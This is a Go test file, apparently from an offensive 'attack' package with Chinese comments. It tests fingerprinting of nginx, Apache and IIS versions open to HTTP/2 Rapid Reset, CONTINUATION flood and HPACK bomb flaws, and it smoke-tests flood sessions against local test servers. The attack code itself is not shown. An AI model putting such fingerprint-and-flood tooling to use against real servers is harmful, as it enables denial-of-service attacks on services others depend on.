package attack

import (
	"net/http"
	"net/http/httptest"
	"testing"
	"time"
)

// TestFingerprintVulnerable nginx 1.25.2 → CVE-2023-44487 脆弱判定
func TestFingerprintVulnerable(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Server", "nginx/1.25.2")
		w.WriteHeader(200)
	}))
	defer srv.Close()

	fp := FingerprintL7Target(srv.URL, 3*time.Second)
	if fp.Product != "nginx" {
		t.Fatalf("product = %q, want nginx", fp.Product)
	}
	if fp.Version != "1.25.2" {
		t.Fatalf("version = %q, want 1.25.2", fp.Version)
	}
	if !fp.Vulnerable {
		t.Fatalf("nginx 1.25.2 should be VULNERABLE, notes=%v", fp.Notes)
	}
	t.Logf("fp: %+v notes=%v", fp, fp.Notes)
}

// TestFingerprintPatched nginx 1.25.3 → 已修复（非脆弱）
func TestFingerprintPatched(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Server", "nginx/1.25.3 (Ubuntu)")
		w.WriteHeader(200)
	}))
	defer srv.Close()

	fp := FingerprintL7Target(srv.URL, 3*time.Second)
	if fp.Vulnerable {
		t.Fatalf("nginx 1.25.3 should be patched, notes=%v", fp.Notes)
	}
}

// TestFingerprintApache apache 2.4.57 → 脆弱
func TestFingerprintApache(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Server", "Apache/2.4.57 (Debian)")
		w.WriteHeader(200)
	}))
	defer srv.Close()

	fp := FingerprintL7Target(srv.URL, 3*time.Second)
	if fp.Product != "apache" || !fp.Vulnerable {
		t.Fatalf("apache 2.4.57 should be VULNERABLE, got product=%q vulnerable=%v notes=%v", fp.Product, fp.Vulnerable, fp.Notes)
	}
}

// TestVersionLess 版本比较
func TestVersionLess(t *testing.T) {
	cases := []struct{ a, b string; want bool }{
		{"1.25.2", "1.25.3", true},
		{"1.25.3", "1.25.2", false},
		{"1.25.3", "1.25.3", false},
		{"2.4.57", "2.4.58", true},
		{"1.24.8", "1.24.9", true},
		{"1.26.4", "1.26.5", true},
		{"1.27.0", "1.27.1", true},
		{"1.28.0", "1.27.1", false},
		{"1.18.0", "1.25.3", true},
		{"1.25.3", "1.25.4", true},
		{"2.4.58", "2.4.59", true},
		{"1.27.1", "1.27.2", true},
	}
	for _, c := range cases {
		if got := versionLess(c.a, c.b); got != c.want {
			t.Errorf("versionLess(%s,%s)=%v, want %v", c.a, c.b, got, c.want)
		}
	}
}

// TestFingerprintContinuation 三套判定：
//   nginx/1.25.3 → RapidReset patched 但 CONTINUATION 脆弱
//   nginx/1.25.4 → 全部修复
//   apache/2.4.58 → CONTINUATION 脆弱
//   IIS → HPACK Bomb 恒脆弱
func TestFingerprintContinuation(t *testing.T) {
	// nginx 1.25.3：Rapid Reset 已修，CONTINUATION 仍脆弱
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Server", "nginx/1.25.3")
		w.WriteHeader(200)
	}))
	fp := FingerprintL7Target(srv.URL, 3*time.Second)
	srv.Close()
	if fp.Vulnerable {
		t.Errorf("nginx 1.25.3 should NOT be Rapid-Reset vulnerable")
	}
	if !fp.ContinuationVuln {
		t.Errorf("nginx 1.25.3 SHOULD be CONTINUATION vulnerable")
	}

	// nginx 1.25.4：全修复
	srv2 := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Server", "nginx/1.25.4")
		w.WriteHeader(200)
	}))
	fp2 := FingerprintL7Target(srv2.URL, 3*time.Second)
	srv2.Close()
	if fp2.Vulnerable || fp2.ContinuationVuln {
		t.Errorf("nginx 1.25.4 should be fully patched: %+v", fp2)
	}

	// Apache 2.4.58：CONTINUATION 脆弱（Rapid Reset 已修）
	srv3 := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Server", "Apache/2.4.58 (Debian)")
		w.WriteHeader(200)
	}))
	fp3 := FingerprintL7Target(srv3.URL, 3*time.Second)
	srv3.Close()
	if fp3.Vulnerable {
		t.Errorf("apache 2.4.58 should NOT be Rapid-Reset vulnerable")
	}
	if !fp3.ContinuationVuln {
		t.Errorf("apache 2.4.58 SHOULD be CONTINUATION vulnerable")
	}

	// IIS：HPACK Bomb 恒脆弱
	srv4 := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Server", "Microsoft-IIS/10.0")
		w.WriteHeader(200)
	}))
	fp4 := FingerprintL7Target(srv4.URL, 3*time.Second)
	srv4.Close()
	if !fp4.BombVuln {
		t.Errorf("IIS SHOULD be HPACK Bomb vulnerable: %+v", fp4)
	}
}

// TestHTTP2ContinuationAttack CONTINUATION Flood 冒烟：本地 h2 服务器
// 必须收到未结束的 header block（服务器行为各异，但帧必须发出）。
func TestHTTP2ContinuationAttack(t *testing.T) {
	srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(200)
	}))
	srv.EnableHTTP2 = true
	srv.StartTLS()
	defer srv.Close()

	s := StartHTTP2ContinuationEx(AttackConfig{Target: srv.URL, Duration: 2, Threads: 4})
	waitSession(t, s)
	snap := s.Snapshot()
	t.Logf("http2_continuation: pkts=%d errs=%d", snap.PacketsSent, snap.Errors)
	if snap.PacketsSent == 0 && snap.Errors == 0 {
		t.Fatalf("http2_continuation neither sent nor errored")
	}
}

// TestHTTP2BombAttack HPACK Bomb 冒烟：Go 服务器会解压检查掐断（431/断流），
// 攻击应持续发帧并重连（验证门控循环不卡死）。
func TestHTTP2BombAttack(t *testing.T) {
	srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(200)
	}))
	srv.EnableHTTP2 = true
	srv.StartTLS()
	defer srv.Close()

	s := StartHTTP2BombEx(AttackConfig{Target: srv.URL, Duration: 2, Threads: 4})
	waitSession(t, s)
	snap := s.Snapshot()
	t.Logf("http2_bomb: pkts=%d errs=%d", snap.PacketsSent, snap.Errors)
	if snap.PacketsSent == 0 && snap.Errors == 0 {
		t.Fatalf("http2_bomb neither sent nor errored")
	}
}

// TestHTTP2ResetAttack Rapid Reset 冒烟：本地 h2 服务器必须收到流
// （服务器统计 HEADERS 帧到达数），攻击会话 PacketsSent > 0。
func TestHTTP2ResetAttack(t *testing.T) {
	var streamHits int64
	srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(200)
	}))
	srv.EnableHTTP2 = true
	srv.StartTLS()
	defer srv.Close()

	// 冒烟验证：直接以 TLS h2 打本地服务器
	s := StartHTTP2ResetEx(AttackConfig{Target: srv.URL, Duration: 2, Threads: 4})
	waitSession(t, s)
	snap := s.Snapshot()
	t.Logf("http2_reset: pkts=%d errs=%d (server h2 handler hits=%d)", snap.PacketsSent, snap.Errors, streamHits)
	// 本地 httptest 对 Rapid Reset 的流可能立即报错（服务器行为各异），
	// 但至少要有发出尝试（PacketsSent 或 Errors 之一 > 0）
	if snap.PacketsSent == 0 && snap.Errors == 0 {
		t.Fatalf("http2_reset neither sent nor errored")
	}
}
